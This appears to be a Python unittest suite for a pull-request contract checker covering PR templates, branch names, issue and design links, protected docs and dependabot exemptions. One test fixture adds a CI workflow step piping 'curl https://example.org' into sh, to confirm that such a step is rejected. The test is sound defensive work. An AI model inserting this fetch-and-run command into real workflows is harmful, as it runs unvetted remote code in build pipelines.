import unittest

import helpers
from helpers import MemClient, body, fc, make_pr
from pr_contract import rules
from pr_contract.errors import ApiError, LimitExceeded


def evaluate(pr, client=None, files=None):
    client = client or MemClient()
    if files is not None:
        client.files[pr.number] = files
    return rules.evaluate(pr, client, helpers.TEMPLATES)


def ids(violations):
    return {v.rule for v in violations}


def text(violations):
    return " | ".join(f"{v.rule}: {v.message}" for v in violations)


class PassingCases(unittest.TestCase):
    def test_each_type_passes_with_a_complete_body(self):
        for kind in helpers.TYPES:
            with self.subTest(kind=kind):
                violations = evaluate(make_pr(kind), files=[fc("docs/x.md")] if kind == "design" else [fc("scripts/x")])
                self.assertEqual(violations, [], text(violations))


class PC1(unittest.TestCase):
    def test_missing_empty_and_comment_only_sections_fail(self):
        for kind in helpers.TYPES:
            for heading in helpers.headings(kind):
                for mode in ("omit", "empty", "comment_only"):
                    with self.subTest(kind=kind, heading=heading, mode=mode):
                        top = helpers.IMPL_TOP if kind == "implementation" else ""
                        pr = make_pr(kind, body=body(kind, top=top, **{mode: (heading,)}))
                        files = [fc("docs/x.md")] if kind == "design" else [fc("scripts/x")]
                        violations = [v for v in evaluate(pr, files=files) if v.rule == "PC-1"]
                        self.assertTrue(violations)
                        self.assertIn(heading, violations[0].message)

    def test_heading_inside_a_fence_or_comment_does_not_count(self):
        sections = {"Summary": "```\n## Validation\nfake\n```"}
        pr = make_pr(body=body("implementation", top=helpers.IMPL_TOP, omit=("Validation",), sections=sections))
        self.assertIn("PC-1", ids(evaluate(pr)))
        hidden = body("implementation", top=helpers.IMPL_TOP, omit=("Validation",),
                      extra="<!--\n## Validation\nfake\n-->")
        self.assertIn("PC-1", ids(evaluate(make_pr(body=hidden))))

    def test_template_placeholder_body_fails(self):
        raw = (helpers.TEMPLATES / "implementation.md").read_text()
        self.assertIn("PC-1", ids(evaluate(make_pr(body=raw))))

    def test_checkbox_state_is_ignored(self):
        sections = {"Checkpoint": "- [x] done\n- [ ] not done"}
        pr = make_pr(body=body("implementation", top=helpers.IMPL_TOP, sections=sections))
        self.assertEqual(evaluate(pr), [])

    def test_null_body_fails_closed(self):
        self.assertIn("PC-1", ids(evaluate(make_pr(body=""))))

    def test_oversized_body_fails(self):
        pr = make_pr(body=body("implementation", top=helpers.IMPL_TOP) + "x" * 70000)
        self.assertIn("too large", text(evaluate(pr)))

    def test_too_many_lines_fails(self):
        pr = make_pr(body=body("implementation", top=helpers.IMPL_TOP) + "\n" * 6000)
        self.assertIn("too large", text(evaluate(pr)))


class PC2(unittest.TestCase):
    def test_unknown_prefix_fails(self):
        for head in ("feature/x", "main", "impl/x", "design/CR-x-y", "Impl/CR-2-x", "impl/CR-2-", ""):
            with self.subTest(head=head):
                self.assertIn("PC-2", ids(evaluate(make_pr(head_ref=head))))

    def test_missing_marker_fails(self):
        pr = make_pr(body=body("implementation", top=helpers.IMPL_TOP, marker=False))
        self.assertIn("marker", text(evaluate(pr)))

    def test_marker_and_branch_mismatch_fails(self):
        pr = make_pr("change", body=body("infra"))
        self.assertIn("does not match", text(evaluate(pr)))

    def test_branch_number_must_match_the_referenced_issue(self):
        self.assertIn("PC-2", ids(evaluate(make_pr(head_ref="impl/CR-5-thing"))))
        self.assertIn("PC-2", ids(evaluate(make_pr("design", head_ref="design/CR-5-thing"), files=[fc("docs/x.md")])))

    def test_design_without_issue_reference_fails(self):
        pr = make_pr("design", body=body("design", sections={"Change request": "no reference here"}))
        self.assertIn("PC-2", ids(evaluate(pr, files=[fc("docs/x.md")])))

    def test_dependabot_branch_from_a_human_is_not_exempt(self):
        pr = make_pr(head_ref="dependabot/pip/x", author="someone")
        self.assertIn("PC-2", ids(evaluate(pr)))

    def test_bot_author_on_a_normal_branch_is_not_exempt(self):
        pr = make_pr(author="dependabot[bot]", body="")
        self.assertIn("PC-1", ids(evaluate(pr)))


class PC3(unittest.TestCase):
    def impl(self, top, **kw):
        return make_pr(body=body("implementation", top=top), **kw)

    def test_missing_references_fail(self):
        self.assertIn("Implements", text(evaluate(self.impl("Design: #3"))))
        self.assertIn("Design", text(evaluate(self.impl("Implements: #2"))))

    def test_issue_must_exist_and_not_be_a_pr(self):
        client = MemClient(issues={2: "pull_request"})
        self.assertIn("pull request, not an issue", text(evaluate(make_pr(), client)))
        client = MemClient()
        del client.issues[2]
        self.assertIn("not found", text(evaluate(make_pr(), client)))

    def test_design_pr_must_exist(self):
        client = MemClient()
        del client.prs[3]
        self.assertIn("design PR #3 not found", text(evaluate(make_pr(), client)))

    def test_design_pr_must_be_merged(self):
        client = MemClient(prs={3: make_pr("design", number=3, merged=False, state="open")})
        self.assertIn("not merged", text(evaluate(make_pr(), client)))

    def test_design_pr_must_target_the_same_base(self):
        client = MemClient(prs={3: make_pr("design", number=3, merged=True, base_ref="other")})
        self.assertIn("base branch", text(evaluate(make_pr(), client)))

    def test_design_pr_must_be_a_design_branch_of_the_same_issue(self):
        for head in ("impl/CR-2-x", "design/CR-9-x", "change/x"):
            with self.subTest(head=head):
                client = MemClient(prs={3: make_pr("design", number=3, merged=True, head_ref=head)})
                self.assertIn("not a design branch", text(evaluate(make_pr(), client)))

    def test_design_pr_must_reference_the_issue_in_its_change_request(self):
        other = body("design", sections={"Change request": "CR: #9"})
        client = MemClient(prs={3: make_pr("design", number=3, merged=True, body=other)})
        self.assertIn("Change request", text(evaluate(make_pr(), client)))
        elsewhere = body("design", sections={"Change request": "none", "Summary": "mentions #2 here"})
        client = MemClient(prs={3: make_pr("design", number=3, merged=True, body=elsewhere)})
        self.assertIn("Change request", text(evaluate(make_pr(), client)))

    def test_design_reference_to_itself_fails(self):
        pr = self.impl("Implements: #2\nDesign: #10")
        client = MemClient(prs={10: make_pr(number=10)})
        self.assertIn("this PR", text(evaluate(pr, client)))

    def test_only_implementation_prs_are_checked(self):
        self.assertEqual(evaluate(make_pr("change"), files=[fc("scripts/x")]), [])


class PC4(unittest.TestCase):
    def test_design_pr_may_only_touch_docs(self):
        pr = make_pr("design")
        self.assertEqual(evaluate(pr, files=[fc("docs/a.md"), fc("docs/cr/CR-2/design.md")]), [])
        self.assertIn("PC-4", ids(evaluate(pr, files=[fc("docs/a.md"), fc("scripts/x.sh")])))
        self.assertIn("PC-4", ids(evaluate(pr, files=[fc("README.md")])))
        self.assertIn("PC-4", ids(evaluate(pr, files=[fc("docsx/a.md")])))

    def test_rename_source_is_checked(self):
        pr = make_pr("design")
        self.assertIn("PC-4", ids(evaluate(pr, files=[fc("docs/new.md", "renamed", previous="scripts/old.sh")])))

    def test_not_applied_to_other_types(self):
        self.assertNotIn("PC-4", ids(evaluate(make_pr(), files=[fc("scripts/x")])))


class PC5(unittest.TestCase):
    PROTECTED = ("docs/cr/CR-2/design.md", "docs/cr/CR-9/acceptance-criteria.md", "docs/adr/ADR-001-x.md",
                 "docs/adr/sub/new.md")

    def test_protected_files_fail_for_implementation_and_change(self):
        for kind in ("implementation", "change"):
            for path in self.PROTECTED:
                for status in ("added", "modified", "removed"):
                    with self.subTest(kind=kind, path=path, status=status):
                        self.assertIn("PC-5", ids(evaluate(make_pr(kind), files=[fc(path, status)])))

    def test_rename_source_is_checked(self):
        pr = make_pr("implementation")
        self.assertIn("PC-5", ids(evaluate(pr, files=[fc("docs/other.md", "renamed", previous="docs/cr/CR-2/design.md")])))
        self.assertIn("PC-5", ids(evaluate(pr, files=[fc("docs/adr/x.md", "renamed", previous="docs/y.md")])))

    def test_other_docs_are_fine(self):
        for path in ("docs/README.md", "docs/cr/CR-2/README.md", "docs/cr/CR-2/implementation-plan.md",
                     "docs/cr/CR-2/sub/design.md", "docs/operations/x.md"):
            with self.subTest(path=path):
                self.assertNotIn("PC-5", ids(evaluate(make_pr(), files=[fc(path)])))

    def test_design_prs_may_change_them(self):
        self.assertEqual(evaluate(make_pr("design"), files=[fc("docs/cr/CR-2/design.md"), fc("docs/adr/x.md")]), [])


class PC6(unittest.TestCase):
    JUSTIFICATION = "Workflow change justification"

    def test_workflow_change_needs_the_section(self):
        for path in (".github/workflows/ci.yml", ".github/actions/x/action.yml"):
            with self.subTest(path=path):
                self.assertIn("PC-6", ids(evaluate(make_pr(), files=[fc(path)])))

    def test_section_present_and_non_empty_passes(self):
        pr = make_pr(body=body("implementation", top=helpers.IMPL_TOP,
                               extra=f"## {self.JUSTIFICATION}\nWhat, why, risk."))
        self.assertEqual(evaluate(pr, files=[fc(".github/workflows/ci.yml")]), [])

    def test_empty_or_comment_only_section_fails(self):
        for content in ("", "<!-- nothing -->"):
            with self.subTest(content=content):
                pr = make_pr(body=body("implementation", top=helpers.IMPL_TOP, extra=f"## {self.JUSTIFICATION}\n{content}"))
                self.assertIn("PC-6", ids(evaluate(pr, files=[fc(".github/workflows/ci.yml")])))

    def test_section_inside_a_fence_does_not_count(self):
        pr = make_pr(body=body("implementation", top=helpers.IMPL_TOP,
                               extra=f"```\n## {self.JUSTIFICATION}\ntext\n```"))
        self.assertIn("PC-6", ids(evaluate(pr, files=[fc(".github/workflows/ci.yml")])))

    def test_rename_out_of_workflows_counts(self):
        pr = make_pr()
        self.assertIn("PC-6", ids(evaluate(pr, files=[fc("scripts/ci.yml", "renamed", previous=".github/workflows/ci.yml")])))

    def test_no_workflow_change_needs_nothing(self):
        self.assertNotIn("PC-6", ids(evaluate(make_pr(), files=[fc(".github/PULL_REQUEST_TEMPLATE/x.md")])))


USES_PATCH = ("@@ -10,7 +10,7 @@ jobs:\n steps:\n"
              "-      - uses: actions/checkout@" + "a" * 40 + " # v7.0.1\n"
              "+      - uses: actions/checkout@" + "b" * 40 + " # v7.0.2\n with:\n")


def bot_pr(**over):
    base = dict(author="dependabot[bot]", head_ref="dependabot/github_actions/actions/checkout-7", body="Bumps a dependency.")
    base.update(over)
    return make_pr(**base)


class PC7(unittest.TestCase):
    def test_uses_only_workflow_change_passes(self):
        self.assertEqual(evaluate(bot_pr(), files=[fc(".github/workflows/ci.yml", patch=USES_PATCH)]), [])

    def test_manifests_and_lockfiles_pass(self):
        files = [fc("toolchain/python/builder.lock", patch="@@ -1 +1 @@\n-a\n+b\n"), fc("requirements.txt"),
                 fc("sub/requirements-dev.txt"), fc("package-lock.json"), fc("go.sum")]
        self.assertEqual(evaluate(bot_pr(), files=files), [])

    def test_exemption_skips_pc1_to_pc3(self):
        self.assertEqual(evaluate(bot_pr(body=""), files=[fc("requirements.txt")]), [])

    def test_other_changes_fail(self):
        for path in ("scripts/pr-contract", "docs/README.md", "README.md", ".github/dependabot.yml"):
            with self.subTest(path=path):
                self.assertIn("PC-7", ids(evaluate(bot_pr(), files=[fc(path)])))

    def test_workflow_change_beyond_uses_fails(self):
        patch = USES_PATCH + "+      - run: curl https://example.org | sh\n"
        self.assertIn("PC-7", ids(evaluate(bot_pr(), files=[fc(".github/workflows/ci.yml", patch=patch)])))
        patch = "@@ -1 +1 @@\n-name: a\n+name: b\n"
        self.assertIn("PC-7", ids(evaluate(bot_pr(), files=[fc(".github/workflows/ci.yml", patch=patch)])))

    def test_missing_patch_fails_closed(self):
        self.assertIn("patch unavailable", text(evaluate(bot_pr(), files=[fc(".github/workflows/ci.yml")])))

    def test_added_removed_or_renamed_workflow_fails(self):
        for status in ("added", "removed"):
            with self.subTest(status=status):
                self.assertIn("PC-7", ids(evaluate(bot_pr(), files=[fc(".github/workflows/ci.yml", status, patch=USES_PATCH)])))
        renamed = fc(".github/workflows/new.yml", "renamed", previous=".github/workflows/ci.yml", patch=USES_PATCH)
        self.assertIn("PC-7", ids(evaluate(bot_pr(), files=[renamed])))

    def test_rename_source_must_be_allowed_too(self):
        self.assertIn("PC-7", ids(evaluate(bot_pr(), files=[fc("requirements.txt", "renamed", previous="scripts/x.py")])))

    def test_bot_with_no_files_fails_closed(self):
        self.assertIn("PC-7", ids(evaluate(bot_pr(), files=[])))


class Limits(unittest.TestCase):
    def test_file_cap_fails_closed(self):
        class Capped(MemClient):
            def pull_files(self, number):
                raise LimitExceeded("cap")

        self.assertIn("too many changed files", text(evaluate(make_pr("design"), Capped())))

    def test_changed_files_count_at_the_cap_fails_closed(self):
        self.assertIn("too many changed files", text(evaluate(make_pr(changed_files=3000), files=[])))

    def test_api_errors_propagate(self):
        with self.assertRaises(ApiError):
            evaluate(make_pr(), MemClient(fail=ApiError("boom")))


if __name__ == "__main__":
    unittest.main()
